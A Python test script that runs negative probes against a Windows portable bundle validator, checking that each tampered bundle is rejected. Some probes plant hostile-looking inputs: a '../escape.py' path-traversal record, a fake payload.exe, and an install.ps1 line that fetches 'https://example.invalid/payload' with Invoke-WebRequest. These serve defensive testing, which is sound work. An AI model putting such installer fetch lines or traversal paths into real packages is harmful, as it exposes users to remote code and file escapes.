"""Run repeatable negative probes against the Windows portable bundle validator."""

from __future__ import annotations

import argparse
import json
import shutil
import sys
import tempfile
from pathlib import Path
from typing import Any, Callable


REPO_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO_ROOT / "tools"))

from build_igd_windows_bundle import (  # noqa: E402
    BundleError,
    MANIFEST_NAME,
    build_bundle,
    digest_file,
    pretty_json,
    validate_bundle,
)


Mutation = Callable[[Path], None]
Probe = tuple[str, Mutation, str]


def manifest_path(root: Path) -> Path:
    return root / MANIFEST_NAME


def read_manifest(root: Path) -> dict[str, Any]:
    value = json.loads(manifest_path(root).read_text(encoding="utf-8"))
    if not isinstance(value, dict):
        raise AssertionError("baseline manifest root must be an object")
    return value


def write_manifest(root: Path, value: dict[str, Any]) -> None:
    manifest_path(root).write_text(pretty_json(value), encoding="utf-8", newline="\n")


def refresh_record(root: Path, relative: str) -> None:
    manifest = read_manifest(root)
    path = root / Path(*relative.split("/"))
    for record in manifest["files"]:
        if record["path"] == relative:
            record["sha256"] = digest_file(path)
            record["byteLength"] = path.stat().st_size
            write_manifest(root, manifest)
            return
    raise AssertionError(f"missing baseline record: {relative}")


def missing_runtime_file(root: Path) -> None:
    (root / "tools/igd_daily.py").unlink()


def extra_unrecorded_file(root: Path) -> None:
    (root / "tools/extra.py").write_text("# unrecorded\n", encoding="utf-8")


def stale_launcher_digest(root: Path) -> None:
    with (root / "igd.cmd").open("a", encoding="utf-8") as handle:
        handle.write("rem stale mutation\n")


def stale_launcher_length(root: Path) -> None:
    manifest = read_manifest(root)
    for record in manifest["files"]:
        if record["path"] == "igd.cmd":
            record["byteLength"] += 1
            break
    write_manifest(root, manifest)


def unsafe_executable_payload(root: Path) -> None:
    path = root / "tools/payload.exe"
    path.write_bytes(b"not-an-executable")
    manifest = read_manifest(root)
    manifest["files"].append(
        {"path": "tools/payload.exe", "sha256": digest_file(path), "byteLength": path.stat().st_size}
    )
    manifest["files"].sort(key=lambda item: item["path"])
    manifest["fileCount"] = len(manifest["files"])
    write_manifest(root, manifest)


def path_traversal_record(root: Path) -> None:
    manifest = read_manifest(root)
    manifest["files"].append({"path": "../escape.py", "sha256": "sha256:" + "0" * 64, "byteLength": 0})
    manifest["files"].sort(key=lambda item: item["path"])
    manifest["fileCount"] = len(manifest["files"])
    write_manifest(root, manifest)


def promoted_network_authority(root: Path) -> None:
    manifest = read_manifest(root)
    manifest["authority"]["networkAccessed"] = True
    write_manifest(root, manifest)


def removed_required_entrypoint(root: Path) -> None:
    relative = "tools/igd.py"
    (root / Path(*relative.split("/"))).unlink()
    manifest = read_manifest(root)
    manifest["files"] = [record for record in manifest["files"] if record["path"] != relative]
    manifest["fileCount"] = len(manifest["files"])
    manifest["runtime"]["pythonModules"] = [
        path for path in manifest["runtime"]["pythonModules"] if path != relative
    ]
    write_manifest(root, manifest)


def duplicate_file_record(root: Path) -> None:
    manifest = read_manifest(root)
    record = next(record for record in manifest["files"] if record["path"] == "README.txt")
    manifest["files"].append(dict(record))
    manifest["files"].sort(key=lambda item: item["path"])
    manifest["fileCount"] = len(manifest["files"])
    write_manifest(root, manifest)


def network_installer_instruction(root: Path) -> None:
    with (root / "install.ps1").open("a", encoding="utf-8") as handle:
        handle.write("\nInvoke-WebRequest https://example.invalid/payload\n")
    refresh_record(root, "install.ps1")


def rewired_entrypoint(root: Path) -> None:
    manifest = read_manifest(root)
    manifest["entrypoints"]["cli"] = "tools/intentgraph.py"
    write_manifest(root, manifest)


PROBES: list[Probe] = [
    ("missing-runtime-file", missing_runtime_file, "missing bundle file: tools/igd_daily.py"),
    ("extra-unrecorded-file", extra_unrecorded_file, "bundle contains extra files: tools/extra.py"),
    ("stale-launcher-digest", stale_launcher_digest, "stale bundle digest: igd.cmd"),
    ("stale-launcher-length", stale_launcher_length, "stale bundle byte length: igd.cmd"),
    ("unsafe-executable-payload", unsafe_executable_payload, "unsafe or unsupported bundle payload path"),
    ("path-traversal-record", path_traversal_record, "unsafe bundle path"),
    ("promoted-network-authority", promoted_network_authority, "unsafe bundle authority boundary"),
    ("removed-required-entrypoint", removed_required_entrypoint, "bundle is missing required runtime files: tools/igd.py"),
    ("duplicate-file-record", duplicate_file_record, "duplicate bundle file record: README.txt"),
    ("network-installer-instruction", network_installer_instruction, "unsafe installer instruction in install.ps1"),
    ("rewired-entrypoint", rewired_entrypoint, "unexpected bundle entrypoints"),
]


def run_probe(root: Path, probe: Probe) -> dict[str, Any]:
    probe_id, mutate, expected = probe
    mutate(root)
    errors: list[str] = []
    try:
        validate_bundle(root)
    except (BundleError, OSError) as error:
        errors.append(str(error))
    observed = any(expected in error for error in errors)
    return {
        "id": probe_id,
        "expectedError": expected,
        "actualErrors": errors,
        "expectedFailureObserved": observed,
    }


def run_build_guard_probe(probe_id: str, output: Path, expected: str) -> dict[str, Any]:
    errors: list[str] = []
    try:
        build_bundle(output)
    except (BundleError, OSError) as error:
        normalized = str(error).replace(str(output.resolve()), "<output>").replace(str(REPO_ROOT.resolve()), "<repo-root>")
        errors.append(normalized)
    return {
        "id": probe_id,
        "expectedError": expected,
        "actualErrors": errors,
        "expectedFailureObserved": any(expected in error for error in errors),
    }


def run_negative_probes() -> dict[str, Any]:
    with tempfile.TemporaryDirectory(prefix="igd-windows-bundle-probes-") as temporary:
        root = Path(temporary)
        baseline = root / "baseline"
        archive = root / "baseline.zip"
        build_report = build_bundle(baseline, archive)
        directory_validation = validate_bundle(baseline)
        archive_validation = validate_bundle(archive)
        results: list[dict[str, Any]] = []
        for probe in PROBES:
            candidate = root / f"probe-{probe[0]}"
            shutil.copytree(baseline, candidate)
            results.append(run_probe(candidate, probe))
        results.append(run_build_guard_probe("existing-output-guard", baseline, "bundle output already exists"))
        results.append(
            run_build_guard_probe(
                "protected-output-guard",
                REPO_ROOT / "tools",
                "bundle output must not overwrite a protected repository path",
            )
        )

    passed = (
        build_report.get("result") == "pass"
        and directory_validation.get("result") == "pass"
        and archive_validation.get("result") == "pass"
        and all(item["expectedFailureObserved"] for item in results)
    )
    return {
        "artifactRole": "intentgraph-windows-portable-bundle-negative-probes-report",
        "status": "intentgraph-windows-portable-bundle-negative-probes-passed"
        if passed
        else "intentgraph-windows-portable-bundle-negative-probes-failed",
        "scope": "p9.34-windows-local-portable-distribution-negative-probes",
        "result": "pass" if passed else "fail",
        "positiveBaseline": {
            "buildResult": build_report.get("result"),
            "directoryValidation": directory_validation.get("result"),
            "archiveValidation": archive_validation.get("result"),
            "fileCount": directory_validation.get("fileCount"),
        },
        "probeCount": len(results),
        "probes": results,
        "boundary": {
            "networkAccessed": False,
            "downloadPerformed": False,
            "artifactSigned": False,
            "releasePublished": False,
            "targetRepositoryMutated": False,
        },
    }


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--out", type=Path)
    args = parser.parse_args()
    report = run_negative_probes()
    rendered = pretty_json(report)
    if args.out:
        args.out.parent.mkdir(parents=True, exist_ok=True)
        args.out.write_text(rendered, encoding="utf-8", newline="\n")
    print(rendered, end="")
    return 0 if report["result"] == "pass" else 1


if __name__ == "__main__":
    raise SystemExit(main())
